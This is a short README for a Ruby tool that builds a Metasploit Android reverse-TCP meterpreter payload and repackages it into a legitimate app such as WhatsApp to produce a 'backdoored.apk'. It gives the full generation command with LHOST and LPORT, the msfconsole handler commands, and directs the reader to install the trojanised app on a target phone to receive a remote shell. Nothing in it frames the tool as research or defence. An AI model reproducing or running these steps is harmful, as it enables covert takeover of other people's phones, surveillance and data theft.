This is an script which can automatically generate a remote shell with Metasploit and inject it into another given application.

Requirements:
- Ruby
- Metasploit
- apktool
- jarsigner

All these requirements should be installed by default on a Kali Linux.


Generate apk:
1. Put your original application which should be repackaged in the folder OriginalApk.
2. Execute the following command:
    ruby apk-embed-payload.rb ./OriginalApk/Whatsapp.apk -p android/meterpreter/reverse_tcp LHOST=192.168.56.1 LPORT=8432
   -> LHOST is the ip address of your local LHOST
   -> LPORT is the port where you have to open the handler for the remote shell
3. In the folder appears a file named "backdoored.apk". This is the original app repackaged with the remote shell

Open a handler in Metasploit:
1. Start metasploit with the following command: msfconsole
2. Enter the following commands
msf> use exploit/multi/handler
msf> set payload android/meterpreter/reverse_tcp
msf> set lhost 192.168.56.1
msf> set lport 8432
msf> exploit

Now install the backdoored.apk on the target phone and receive the remote shell.

With the help command you get a list of available commands.





Note:
When executing the ruby script the path to your folder should not contain a folder name with a space. This will lead to a failurer of the script